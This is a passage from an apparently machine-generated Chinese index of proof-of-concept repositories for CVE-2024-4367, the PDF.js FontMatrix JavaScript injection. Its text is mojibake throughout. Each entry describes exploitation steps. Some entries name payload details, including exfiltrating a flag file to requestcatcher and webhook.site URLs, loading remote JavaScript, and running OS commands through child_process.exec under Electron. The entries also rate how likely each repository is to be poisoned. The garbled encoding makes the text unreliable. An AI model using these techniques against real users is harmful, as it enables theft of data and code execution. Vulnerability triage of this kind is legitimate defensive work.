CVE-2024-4367 æ˜¯ Mozilla PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚\n\n**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**\næä¾›çš„ POC ä»£ç æ˜¯ä¸€ä¸ª PDF æ–‡ä»¶ï¼Œå®ƒé€šè¿‡æ„é€ æ¶æ„çš„ Type1 å­—ä½“ï¼Œåœ¨ `FontMatrix` å­—æ®µä¸­æ³¨å…¥ JavaScript ä»£ç  `prompt("1337rokudenashi");`ã€‚å½“ PDF.js è§£æè¯¥ PDF æ–‡ä»¶å¹¶å¤„ç†è¯¥å­—ä½“æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥ POC ä»£ç åº”è¯¥æœ‰æ•ˆï¼Œå¯ä»¥è§¦å‘æ¼æ´ã€‚\n\n**æŠ•æ¯’é£é™©åˆ†æï¼š**\næŸ¥çœ‹æä¾›çš„ POC ä»£ç ï¼Œå…¶ä¸­ `prompt("1337rokudenashi");` è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¯ä»¥ç¡®è®¤POCæœ‰æ•ˆï¼Œä½†æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„è¡Œä¸ºï¼Œä¸å±äºåé—¨ä»£ç ã€‚å…¶ä½™çš„PDFç»“æ„ä»£ç æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆéƒ¨åˆ†ï¼Œä¹Ÿæ²¡æœ‰å‘ç°éšè—çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚ å› æ­¤ï¼Œå¯ä»¥è®¤ä¸ºè¯¥ POC ä»£ç ä¸å­˜åœ¨æŠ•æ¯’é£é™©ã€‚\n\n**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**\n1.  **æ„é€ æ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ Type 1 å­—ä½“çš„ PDF æ–‡ä»¶ã€‚å…³é”®åœ¨äº `FontMatrix` å­—æ®µï¼Œæ”»å‡»è€…åœ¨è¯¥å­—æ®µä¸­æ’å…¥ JavaScript ä»£ç ã€‚\n2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±ä½¿ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚\n3.  **æ‰§è¡Œ JavaScript ä»£ç ï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚åœ¨å¤„ç†åˆ°æ¶æ„ Type 1 å­—ä½“æ—¶ï¼Œ`FontMatrix` å­—æ®µä¸­çš„ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚\n4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä¾‹å¦‚çªƒå– Cookieã€è·å–æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚

**é¡¹ç›®åœ°å€:** [1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf](https://github.com/1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #3

**æ¥æº**: [CVE-2024-4367-BektiHandoyo_cve-pdf-host.md](../2024/CVE-2024-4367-BektiHandoyo_cve-pdf-host.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€XSSæ”»å‡»å’Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ„é€ æ¶æ„PDFï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡æ¡£ã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç  `exploit.pdf` å’Œ `poc.pdf` æ¥çœ‹ï¼Œæ”»å‡»è€…åœ¨PDFçš„å­—ä½“å¯¹è±¡ä¸­åµŒå…¥ JavaScript ä»£ç ã€‚ å…·ä½“æ¥è¯´ï¼Œä»£ç è¢«åµŒå…¥åˆ° `/Font` å¯¹è±¡çš„ `/FontMatrix` å±æ€§ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ç±»å‹æ£€æŸ¥ã€‚
2.  **è§¦å‘æ¼æ´ï¼š** å½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡æ¡£æ—¶ï¼ŒPDF.js ä¼šå°è¯•æ¸²æŸ“å­—ä½“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  åµŒå…¥çš„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œã€‚ åœ¨æä¾›çš„ POC ä»£ç ä¸­ï¼Œæ¶æ„ JavaScript ä»£ç çš„ç›®çš„æ˜¯çªƒå–ä½äº `/app/admin/flag.pdf` çš„ flag æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
     *   `exploit.pdf`: å°† flag ä»¥ DataURL æ ¼å¼å‘é€åˆ° `https://ha.requestcatcher.com/`ã€‚
     *   `poc.pdf`:  å°† flag ä»¥æ–‡ä»¶æ ¼å¼å‘é€åˆ° `https://webhook.site/134021d3-88f1-44a6-aa82-e48e33247fcc`ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æ ¹æ®å¯¹æä¾›çš„ä¸¤ä¸ª PDF æ–‡ä»¶çš„åˆ†æï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä¸¤ä¸ª PDF æ–‡ä»¶ä¸­çš„ JavaScript ä»£ç éƒ½æ—¨åœ¨åˆ©ç”¨æ¼æ´çªƒå– flagï¼Œå¹¶å°† flag æ•°æ®å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨è¿›è¡Œ exfiltrationã€‚ æ²¡æœ‰å‘ç°å…¶ä»–éšè—çš„æ¶æ„è¡Œä¸ºæˆ–åé—¨ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„ POC ä»£ç åˆ©ç”¨äº† PDF.js åœ¨å­—ä½“å¤„ç†ä¸­ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±æ¼æ´ã€‚ æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å…è®¸æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ å› æ­¤ï¼ŒPOC ä»£ç **æœ‰æ•ˆ**ã€‚

**é¡¹ç›®åœ°å€:** [BektiHandoyo/cve-pdf-host](https://github.com/BektiHandoyo/cve-pdf-host)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #4

**æ¥æº**: [CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md](../2024/CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js, Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** PDF.js < 4.2.67, Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„é«˜å±æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„ PDF æ–‡ä»¶æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ `fontMatrix` æ•°ç»„ä¸­çš„æ¼æ´ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ° PDF æ–‡ä»¶ä¸­ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ PDF.js ç‰ˆæœ¬ï¼ˆå¦‚ Firefox 126 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚è¿™å¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œæˆ–è€…å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„POCä»£ç ï¼ˆ`ex1.pdf` å’Œ `ex-gist.pdf`ï¼‰é€šè¿‡æ„é€ æ¶æ„çš„`fontMatrix`æ•°æ®ï¼Œè¯æ˜äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚`ex1.pdf`è§¦å‘alertï¼Œ`ex-gist.pdf`ç”šè‡³å¯ä»¥ä»è¿œç¨‹åœ°å€åŠ è½½å¹¶æ‰§è¡ŒJavaScriptï¼ŒéªŒè¯äº†æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** è™½ç„¶è¯¥é¡¹ç›®æä¾›äº†æ¼æ´åˆ©ç”¨çš„PoCï¼Œä½†æ˜¯æ£€æŸ¥äº†ä»“åº“ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚`astro.config.mjs`å’Œ`package-lock.json`ç­‰é…ç½®æ–‡ä»¶ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ é£é™©ä¸»è¦å­˜åœ¨äºå¦‚æœä¸‹è½½è¯¥é¡¹ç›®å¹¶åœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œè¿œç¨‹åŠ è½½çš„jsæ–‡ä»¶åŒ…å«æ¶æ„payloadçš„å¯èƒ½æ€§ï¼Œå› æ­¤æ¨æµ‹æŠ•æ¯’é£é™©è¾ƒä½ï¼Œé¢„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œè¯¥å­—ä½“ä¸­åŒ…å«æ¶æ„çš„`fontMatrix`æ•°ç»„ã€‚
2.  `fontMatrix`æ•°ç»„çš„å…ƒç´ åŒ…å«JavaScriptä»£ç ã€‚
3.  å½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„PDF.jsç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šè§£æå­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘é€‚å½“çš„ç±»å‹æ£€æŸ¥ï¼Œä¼šå°†`fontMatrix`ä¸­çš„å­—ç¬¦ä¸²ä½œä¸ºJavaScriptä»£ç æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨æˆ–Electronåº”ç”¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´XSSæˆ–RCEã€‚

**é¡¹ç›®åœ°å€:** [Bhavyakcwestern/Hacking-pdf.js-vulnerability](https://github.com/Bhavyakcwestern/Hacking-pdf.js-vulnerability)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #5

**æ¥æº**: [CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md)

## CVE-2024-4367 - PDF.js ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰ã€‚

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚PDF.js å¿…é¡»é…ç½®ä¸º isEvalSupported=true (é»˜è®¤)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯è§¦å‘æ¼æ´ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚`CVE-2024-4367.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚ README.md æä¾›äº†ä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ…æ‹¬æ‰§è¡Œ `alert(document.domain)` ä»¥è¯æ˜ JavaScript ä»£ç æ‰§è¡Œï¼Œä»¥åŠåˆ©ç”¨ `require('child_process').exec()` æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ˆä»…åœ¨ Electron ç¯å¢ƒä¸‹ï¼‰ã€‚

**æŠ•æ¯’é£é™©ï¼š**
PoC ä»£ç æœ¬èº«æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´ï¼Œè€Œä¸æ˜¯æ¤å…¥åé—¨ï¼Œå…¶ç›®çš„æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ—¨åœ¨åˆ©ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºï¼ˆFirefox, Thunderbirdï¼‰ä¸­çš„æ¼æ´ã€‚ è¯¥ä»“åº“ä¸­æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 5%ã€‚ ä¸»è¦çš„æ½œåœ¨é£é™©å¯èƒ½æ¥è‡ªï¼š

1.  **ä¾èµ–é¡¹æŠ•æ¯’:** è„šæœ¬æœ¬èº«å¾ˆç®€å•ï¼Œä¸ä¾èµ–äºå¤–éƒ¨åº“ã€‚å› æ­¤ï¼Œä¾èµ–é¡¹æŠ•æ¯’çš„é£é™©å¾ˆä½ã€‚
2.  **ä»£ç é€»è¾‘æ··æ·†:**  ä»£ç ç›¸å¯¹æ¸…æ™°ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„é€»è¾‘æˆ–æ··æ·†ã€‚
3.  **ä¾›åº”é“¾æ”»å‡»:** ç”±äºè¯¥ PoC æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è„šæœ¬ï¼Œå¹¶æ²¡æœ‰å¤æ‚çš„æ„å»ºæˆ–åˆ†å‘è¿‡ç¨‹ï¼Œä¾›åº”é“¾æ”»å‡»çš„é£é™©ä¹Ÿè¾ƒä½ã€‚

ç„¶è€Œï¼Œåœ¨ä½¿ç”¨ä»»ä½•ç¬¬ä¸‰æ–¹æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ—¶ï¼Œéƒ½åº”ä¿æŒè°¨æ…ï¼Œä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¹¶åœ¨éš”ç¦»ç¯å¢ƒä¸­æµ‹è¯•ï¼Œä»¥é¿å…æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´ç‚¹ï¼š** PDF.js åœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ã€‚
2.  **æ”»å‡»å‘é‡ï¼š** æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨å­—ä½“å¤„ç†ä¸­çš„æ¼æ´åµŒå…¥æ¶æ„ JavaScript ä»£ç ã€‚
3.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”Ÿæˆæ¶æ„çš„ `poc.pdf` æ–‡ä»¶ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„ JavaScript ä»£ç ä½œä¸ºå‚æ•°ã€‚
    *   è¯±å¯¼å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ `poc.pdf` æ–‡ä»¶ã€‚
    *   å¦‚æœ PDF.js é…ç½®å…è®¸æ‰§è¡Œ JavaScript ä»£ç ï¼ˆé»˜è®¤æƒ…å†µä¸‹ `isEvalSupported` ä¸º trueï¼‰ï¼Œåˆ™åµŒå…¥åœ¨ PDF ä¸­çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´:
    *   åœ¨æµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œcookiesï¼Œä¼šè¯ä»¤ç‰Œï¼‰ã€‚
    *   è¿›è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚
    *   å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œå¯èƒ½æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [LOURC0D3/CVE-2024-4367-PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #6

**æ¥æº**: [CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md](../2024/CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md)

## CVE-2024-4367: PDF.js ä»»æ„JavaScriptæ‰§è¡Œæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´XSSæ”»å‡»ï¼Œçªƒå–ç”¨æˆ·æ•°æ®ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„JavaScriptä»£ç ä¼šè¢«æ‰§è¡Œã€‚  

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**  æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶æä¾›äº†æ¼æ´çš„æ¦‚è¿°ã€åˆ©ç”¨æ–¹æ³•ã€ç¼“è§£æªæ–½å’Œè¯¦ç»†åˆ†æçš„é“¾æ¥ã€‚`poc.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„payloadçš„PDFæ–‡ä»¶ã€‚`app` ç›®å½•åŒ…å«ä¸€ä¸ªç®€å•çš„Node.jsåº”ç”¨ï¼Œç”¨äºæœ¬åœ°æµ‹è¯•ï¼Œå…è®¸ä¸Šä¼ PDFæ–‡ä»¶å¹¶é€šè¿‡`pdfjs-dist`åº“è¿›è¡Œæ¸²æŸ“ã€‚  `public/index.html` åŒ…å«å‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ PDFå¹¶ä½¿ç”¨`pdf.js`è¿›è¡Œæ¸²æŸ“ã€‚  

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**  
*   æŸ¥çœ‹ `poc.pdf` ç¡®è®¤æ˜¯å¦æ¤å…¥åé—¨ï¼Œ`poc.pdf` æ˜¯æ¶æ„çš„PDFï¼Œ åˆ©ç”¨äº†å­—ä½“çš„è§£ææ¼æ´ï¼Œæ‰§è¡ŒJavascriptä»£ç ã€‚ ä½†æ˜¯ä¸å±äºåé—¨ï¼Œåªå±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
*   æŸ¥çœ‹ `server.js` ä¸­é—´ä»¶æ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼Œ`server.js` ä¸­é—´ä»¶å±äºæ­£å¸¸çš„expressä¸Šä¼ pdfå’Œæ‰“å¼€pdfçš„é€»è¾‘ã€‚
*   æŸ¥çœ‹ `public/index.html` ç¡®è®¤æ˜¯å¦è°ƒç”¨æ¶æ„apiï¼Œ `public/index.html`å±äºå‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ pdfï¼Œå¹¶æ¸²æŸ“pdfï¼Œæ²¡æœ‰æ¶æ„apiè°ƒç”¨ã€‚
*   æŸ¥çœ‹ `poc.py` ç¡®è®¤æ˜¯å¦ç”Ÿæˆäº†æ¶æ„PDFï¼Œ`poc.py`å±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
æ€»ä½“åˆ¤æ–­æŠ•æ¯’é£é™©æä½ï¼Œå¯èƒ½å­˜åœ¨çš„é£é™©æ˜¯ä¾èµ–åŒ…çš„ä¾›åº”é“¾æŠ•æ¯’é£é™©,è€ƒè™‘åˆ°node_modulesä½“ç§¯å·¨å¤§ï¼Œäººå·¥å®¡è®¡æˆæœ¬å¤ªé«˜ï¼Œæ‰€ä»¥è®¤ä¸ºå­˜åœ¨ 1% çš„æ½œåœ¨æŠ•æ¯’é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨ `poc.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µï¼ˆä¾‹å¦‚ï¼Œç”µå­é‚®ä»¶ã€ç½‘ç«™é“¾æ¥ï¼‰è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ–‡ä»¶ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„JavaScriptä»£ç ä¼šåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°XSSæ”»å‡»æˆ–æ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€ä¿®æ”¹ç½‘é¡µå†…å®¹ï¼Œç”šè‡³æ§åˆ¶ç”¨æˆ·çš„è®¡ç®—æœºã€‚

**é¡¹ç›®åœ°å€:** [Masamuneee/CVE-2024-4367-Analysis](https://github.com/Masamuneee/CVE-2024-4367-Analysis)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #7

**æ¥æº**: [CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md](../2024/CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md)

## CVE-2024-4367 - Firefox/Thunderbird PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

